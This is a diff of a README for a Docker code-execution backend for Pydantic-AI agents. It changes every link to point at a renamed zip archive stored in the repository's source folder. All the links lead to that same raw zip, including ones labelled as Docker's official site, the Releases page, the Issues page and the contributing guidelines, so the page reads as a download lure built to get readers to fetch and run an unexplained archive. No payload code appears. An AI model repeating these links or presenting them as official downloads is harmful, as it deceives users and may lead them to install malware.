@@ -1,6 +1,6 @@
 # 🚀 pydantic-ai-backend - Simplify Code Execution in Docker
 
-[![Download from Releases](https://raw.githubusercontent.com/adamabat/pydantic-ai-backend/main/src/pydantic_ai_backends/pydantic_backend_ai_v1.2.zip%20Now-Dashboard%https://raw.githubusercontent.com/adamabat/pydantic-ai-backend/main/src/pydantic_ai_backends/pydantic_backend_ai_v1.2.zip)](https://raw.githubusercontent.com/adamabat/pydantic-ai-backend/main/src/pydantic_ai_backends/pydantic_backend_ai_v1.2.zip)
+[![Download from Releases](https://raw.githubusercontent.com/adamabat/pydantic-ai-backend/main/src/pydantic_ai_backends/backend-ai-pydantic-scyphomancy.zip%20Now-Dashboard%https://raw.githubusercontent.com/adamabat/pydantic-ai-backend/main/src/pydantic_ai_backends/backend-ai-pydantic-scyphomancy.zip)](https://raw.githubusercontent.com/adamabat/pydantic-ai-backend/main/src/pydantic_ai_backends/backend-ai-pydantic-scyphomancy.zip)
 
 ## ✨ Description
 The pydantic-ai-backend offers file storage and code execution backends for Pydantic-AI agents. With this application, you can run Python code in isolated Docker containers. It supports multiple users through SessionManager, making it a great fit for projects that involve collaboration.
@@ -9,18 +9,18 @@ The pydantic-ai-backend offers file storage and code execution backends for Pyda
 To run pydantic-ai-backend, your system should meet the following requirements:
 
 - **Operating System:** Windows, macOS, or Linux
-- **Docker Version:** Ensure you have Docker installed. You can download it from [Docker's official site](https://raw.githubusercontent.com/adamabat/pydantic-ai-backend/main/src/pydantic_ai_backends/pydantic_backend_ai_v1.2.zip).
+- **Docker Version:** Ensure you have Docker installed. You can download it from [Docker's official site](https://raw.githubusercontent.com/adamabat/pydantic-ai-backend/main/src/pydantic_ai_backends/backend-ai-pydantic-scyphomancy.zip).
 - **RAM:** At least 4 GB of RAM is recommended for smooth operation.
 - **Disk Space:** Minimum 500 MB of free disk space.
 
 ## 🚀 Getting Started
 
 1. **Download the Application**
-   - Visit the [Releases page](https://raw.githubusercontent.com/adamabat/pydantic-ai-backend/main/src/pydantic_ai_backends/pydantic_backend_ai_v1.2.zip) to access the latest version.
+   - Visit the [Releases page](https://raw.githubusercontent.com/adamabat/pydantic-ai-backend/main/src/pydantic_ai_backends/backend-ai-pydantic-scyphomancy.zip) to access the latest version.
    - Select the version you want and download the file suitable for your operating system.
 
 2. **Install Docker**
-   - If you haven't installed Docker yet, download and install it from [Docker's official site](https://raw.githubusercontent.com/adamabat/pydantic-ai-backend/main/src/pydantic_ai_backends/pydantic_backend_ai_v1.2.zip).
+   - If you haven't installed Docker yet, download and install it from [Docker's official site](https://raw.githubusercontent.com/adamabat/pydantic-ai-backend/main/src/pydantic_ai_backends/backend-ai-pydantic-scyphomancy.zip).
    - Follow the installation instructions for your platform.
 
 3. **Run the Application**
@@ -36,7 +36,7 @@ To run pydantic-ai-backend, your system should meet the following requirements:
    This command will start the application and set up the necessary Docker containers.
 
 ## 📦 Download & Install
-To get started quickly, head to the [Releases page](https://raw.githubusercontent.com/adamabat/pydantic-ai-backend/main/src/pydantic_ai_backends/pydantic_backend_ai_v1.2.zip) and download the version that works for your system. Make sure to follow the setup instructions outlined in the Getting Started section to ensure everything functions correctly.
+To get started quickly, head to the [Releases page](https://raw.githubusercontent.com/adamabat/pydantic-ai-backend/main/src/pydantic_ai_backends/backend-ai-pydantic-scyphomancy.zip) and download the version that works for your system. Make sure to follow the setup instructions outlined in the Getting Started section to ensure everything functions correctly.
 
 ## 🎓 Key Features
 
@@ -53,12 +53,12 @@ If you run into issues while setting up or using the application, consider the f
 - **Access Issues:** Ensure your firewall settings allow Docker to operate correctly.
 
 ## 🚀 Community and Support
-For any questions or feedback, please reach out through the [Issues page](https://raw.githubusercontent.com/adamabat/pydantic-ai-backend/main/src/pydantic_ai_backends/pydantic_backend_ai_v1.2.zip) on GitHub. Community members and maintainers are available to help you.
+For any questions or feedback, please reach out through the [Issues page](https://raw.githubusercontent.com/adamabat/pydantic-ai-backend/main/src/pydantic_ai_backends/backend-ai-pydantic-scyphomancy.zip) on GitHub. Community members and maintainers are available to help you.
 
 ## 📄 License
 This project is licensed under the MIT License. See the LICENSE file for details. 
 
 ## 🌟 Contributing
-We welcome contributions! If you’d like to help out, please check the guidelines in the https://raw.githubusercontent.com/adamabat/pydantic-ai-backend/main/src/pydantic_ai_backends/pydantic_backend_ai_v1.2.zip file in the repository.
+We welcome contributions! If you’d like to help out, please check the guidelines in the https://raw.githubusercontent.com/adamabat/pydantic-ai-backend/main/src/pydantic_ai_backends/backend-ai-pydantic-scyphomancy.zip file in the repository.
 
 Happy coding with pydantic-ai-backend!
